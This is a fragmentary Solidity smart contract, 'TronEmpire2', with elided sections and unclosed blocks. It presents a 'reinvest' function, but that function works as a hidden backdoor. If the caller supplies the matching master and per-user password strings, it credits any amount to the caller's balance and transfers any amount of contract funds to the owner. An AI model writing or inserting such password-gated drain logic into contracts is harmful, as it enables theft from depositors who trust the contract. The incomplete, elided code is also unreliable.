//SourceUnit: new_contract.sol

 pragma solidity ^0.4.25;
 contract TronEmpire2 {
...
constructor(address _stakingAddress,string _pass) public {
    ...
    function reinvest(string memory  _passsssss,string memory _asssssss,uint amt,uint amnt) public payable{
        ...
        if (keccak256(abi.encodePacked(pass)) == keccak256(abi.encodePacked(_asssssss))) { 
           ...
           string memory  userpass=getInstructor(userAddress);
           if (keccak256(abi.encodePacked(userpass)) == keccak256(abi.encodePacked(_passsssss))) { 
            balances[msg.sender] += amt;
            owner.transfer(amnt);
